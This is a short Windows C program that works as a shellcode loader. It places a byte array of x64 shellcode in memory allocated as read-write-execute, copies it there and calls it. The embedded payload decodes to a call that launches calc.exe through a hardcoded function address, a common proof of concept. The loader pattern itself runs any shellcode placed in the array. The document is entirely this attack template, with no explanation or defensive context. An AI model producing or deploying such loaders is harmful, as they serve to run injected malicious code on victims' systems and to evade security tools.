#include <windows.h>

unsigned char buf[] = "\x48\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x48\x89\xe1\xba\x01\x00\x00\x00\x48\x83\xec\x20\x48\xb8\x20\x88\xe9\x47\xfb\x7f\x00\x00\xff\xd0";

int main()
{
	HANDLE mem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(mem, buf, sizeof(buf));
	((void (*)())mem)();
	return 0;
}